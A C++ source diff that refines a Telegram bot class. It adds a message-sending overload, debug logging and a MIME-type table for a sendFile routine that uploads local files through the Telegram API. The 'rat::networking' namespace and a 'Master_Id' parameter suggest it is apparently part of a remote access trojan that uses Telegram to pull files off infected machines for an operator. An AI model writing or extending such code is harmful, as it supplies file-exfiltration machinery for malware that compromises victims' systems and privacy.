@@ -84,8 +84,8 @@ Bot::Bot(const std::string& arg_Token, int64_t Master_Id, uint8_t Telegram_Conne
     this->sending_video_url        = fmt::format("{}{}/sendVideo", TELEGRAM_BOT_API_BASE_URL, token);
     
     this->sending_voice_url        = fmt::format("{}{}/sendVoice", TELEGRAM_BOT_API_BASE_URL, token);
-    getting_file_url         = fmt::format("{}{}/getFile?file_id=", TELEGRAM_BOT_API_BASE_URL, token);
-    getting_update_url       = fmt::format("{}{}/getUpdates?timeout={}&limit=1", TELEGRAM_BOT_API_BASE_URL, token, Telegram_Connection_Timemout);
+    this->getting_file_url         = fmt::format("{}{}/getFile?file_id=", TELEGRAM_BOT_API_BASE_URL, token);
+    this->getting_update_url       = fmt::format("{}{}/getUpdates?timeout={}&limit=1", TELEGRAM_BOT_API_BASE_URL, token, Telegram_Connection_Timemout);
 }
 Bot::Bot(const Bot& other)
     : token(other.token),
@@ -156,18 +156,60 @@ BotResponse Bot::sendMessage(const std::string& Text_Message) {
         return BotResponse::CONNECTION_ERROR;
     }
 }
+BotResponse Bot::sendMessage(const char* Text_Message) {
+    try {
+        if (!Text_Message) return BotResponse::UNKNOWN_ERROR;
+
+        // Escape raw C-string with explicit length
+        char* escaped = curl_easy_escape(nullptr, Text_Message, static_cast<int>(std::strlen(Text_Message)));
+        if (!escaped) return BotResponse::UNKNOWN_ERROR;
+
+        // Build the URL in a single allocation
+        std::string url;
+        url.reserve(sending_message_url_base.size() + std::strlen(escaped));
+        url.append(sending_message_url_base);
+        url.append(escaped);
+        curl_free(escaped);
+
+        DEBUG_LOG("Sending message: {}", url);
+
+        MessageResponseBuffer response_buffer;
+        size_t bytes_read = curl_client.sendHttpRequest(url.c_str(), response_buffer.data(), response_buffer.size());
+
+        if (bytes_read == 0) return BotResponse::CONNECTION_ERROR;
+
+        auto resp = json::parse(response_buffer.data(), response_buffer.data() + bytes_read);
+        return resp.value("ok", false) ? BotResponse::SUCCESS : BotResponse::UNKNOWN_ERROR;
+
+    } catch (const std::exception& e) {
+        ERROR_LOG("sendMessage exception: {}", e.what());
+        return BotResponse::CONNECTION_ERROR;
+    }
+}
+
 BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::string& arg_Caption) {
     try {
-        DEBUG_LOG("Uploading file: {}", File_Path.string());
+        if (!std::filesystem::exists(File_Path)) {
+            ERROR_LOG("sendFile: file does not exist: {}", File_Path.string());
+            return BotResponse::CONNECTION_ERROR;
+        }
+
+        auto file_size = std::filesystem::file_size(File_Path);
+        DEBUG_LOG("sendFile: entering with '{}', size={} bytes", File_Path.string(), file_size);
 
         std::string extension = File_Path.extension().string();
-        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower); // make lowercase
+        std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
+        DEBUG_LOG("sendFile: detected extension '{}'", extension);
 
         // Route to specialized methods
         if (extension == ".jpg" || extension == ".jpeg" || extension == ".png") {
+            DEBUG_LOG("sendFile: routed to sendPhoto() for {}", File_Path.string());
             return this->sendPhoto(File_Path, arg_Caption);
         }
-        // Otherwise, treat it as a generic document
+
+        DEBUG_LOG("sendFile: constructing MimeContext for generic document");
+
+        // Generic document handling
         rat::networking::MimeContext ctx;
         ctx.file_path       = File_Path;
         ctx.url             = sending_document_url;
@@ -176,44 +218,54 @@ BotResponse Bot::sendFile(const std::filesystem::path& File_Path, const std::str
 
         if (!arg_Caption.empty()) {
             ctx.fields_map["caption"] = arg_Caption;
+            DEBUG_LOG("sendFile: added caption '{}'", arg_Caption);
         }
-/*
-        // Map common MIME types 
-        if (extension == ".txt") ctx.mime_type = "text/plain";
-        else if (extension == ".mp3") ctx.mime_type = "audio/mp3";
 
-        else if (extension == ".ogg") ctx.mime_type = "audio/ogg";
-        else if (extension == ".mp4") ctx.mime_type = "video/mpeg";
-        else if (extension == ".pdf") ctx.mime_type = "application/pdf";
-	      else if (extension == ".zip") ctx.mime_type = "application/zip";
-	      else if (extension == ".rar") ctx.mime_type = "application/vnd.rar";
-	      else if (extension == ".7z") ctx.mime_type = "application/x-7z-compressed";
-	      else if (extension == ".csv") ctx.mime_type = "text/csv";
-	      else if (extension == ".json") ctx.mime_type = "application/json";
-	      else if (extension == ".xml") ctx.mime_type = "application/xml";
-	      else if (extension == ".doc") ctx.mime_type = "application/msword";
-	      else if (extension == ".docx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
-	      else if (extension == ".xls") ctx.mime_type = "application/vnd.ms-excel";
-	      else if (extension == ".xlsx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
-	      else if (extension == ".ppt") ctx.mime_type = "application/vnd.ms-powerpoint";
-	      else if (extension == ".pptx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
-	      else if (extension == ".wav") ctx.mime_type = "audio/wav";
-	      else if (extension == ".mov") ctx.mime_type = "video/quicktime";
-	      else if (extension == ".avi") ctx.mime_type = "video/x-msvideo";
-        else ctx.mime_type = "application/octet-stream"; // fallback
-*/      else ctx.mime_type = "document";	
-        bool result = curl_client.uploadMimeFile(ctx);
+        // Map common MIME types
+        if      (extension == ".txt")  ctx.mime_type = "text/plain";
+        else if (extension == ".mp3")  ctx.mime_type = "audio/mp3";
+        else if (extension == ".ogg")  ctx.mime_type = "audio/ogg";
+        else if (extension == ".mp4")  ctx.mime_type = "video/mpeg";
+        else if (extension == ".pdf")  ctx.mime_type = "application/pdf";
+        else if (extension == ".zip")  ctx.mime_type = "application/zip";
+        else if (extension == ".rar")  ctx.mime_type = "application/vnd.rar";
+        else if (extension == ".7z")   ctx.mime_type = "application/x-7z-compressed";
+        else if (extension == ".csv")  ctx.mime_type = "text/csv";
+        else if (extension == ".json") ctx.mime_type = "application/json";
+        else if (extension == ".xml")  ctx.mime_type = "application/xml";
+        else if (extension == ".doc")  ctx.mime_type = "application/msword";
+        else if (extension == ".docx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
+        else if (extension == ".xls")  ctx.mime_type = "application/vnd.ms-excel";
+        else if (extension == ".xlsx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
+        else if (extension == ".ppt")  ctx.mime_type = "application/vnd.ms-powerpoint";
+        else if (extension == ".pptx") ctx.mime_type = "application/vnd.openxmlformats-officedocument.presentationml.presentation";
+        else if (extension == ".wav")  ctx.mime_type = "audio/wav";
+        else if (extension == ".mov")  ctx.mime_type = "video/quicktime";
+        else if (extension == ".avi")  ctx.mime_type = "video/x-msvideo";
+        else ctx.mime_type             = "application/octet-stream"; // fallback
+
+        DEBUG_LOG("sendFile: mime_type resolved to '{}'", ctx.mime_type);
+
+        DEBUG_LOG("sendFile: invoking uploadMimeFile() for {}", File_Path.string());
+        bool result = this->curl_client.uploadMimeFile(ctx);
+
         if (!result) {
-            ERROR_LOG("Failed at uploading file: {}", File_Path.string());
+            ERROR_LOG("sendFile: uploadMimeFile() failed for '{}'", File_Path.string());
+        } else {
+            DEBUG_LOG("sendFile: uploadMimeFile() succeeded for '{}'", File_Path.string());
         }
 
         return result ? BotResponse::SUCCESS : BotResponse::CONNECTION_ERROR;
 
     } catch (const std::exception& e) {
-        ERROR_LOG("sendFile exception: {}", e.what());
+        ERROR_LOG("sendFile: exception '{}'", e.what());
+        return BotResponse::CONNECTION_ERROR;
+    } catch (...) {
+        ERROR_LOG("sendFile: unknown exception");
         return BotResponse::CONNECTION_ERROR;
     }
 }
+
 
 BotResponse Bot::sendPhoto(const std::filesystem::path& Photo_Path, const std::string& arg_Caption) {
     try {
